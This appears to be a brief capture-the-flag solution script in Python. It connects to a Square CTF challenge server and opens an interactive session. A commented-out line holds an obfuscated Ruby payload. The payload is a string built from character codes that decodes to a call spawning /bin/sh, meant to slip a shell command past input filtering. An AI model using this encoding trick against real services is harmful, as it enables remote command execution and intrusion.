from ptrlib import *
sock = Socket('talk-to-me-dd00922915bfc3f1.squarectf.com', 5678)

sock.recvuntil("Hello!")
# ruby_code = "'' << 115 << 121 << 115 << 116 << 101 << 109 << 40 << 34 << 47 << 98 << 105 << 110 << 47 << 115 << 104 << 34 << 41"
# sock.sendline(ruby_code)
sock.interactive()

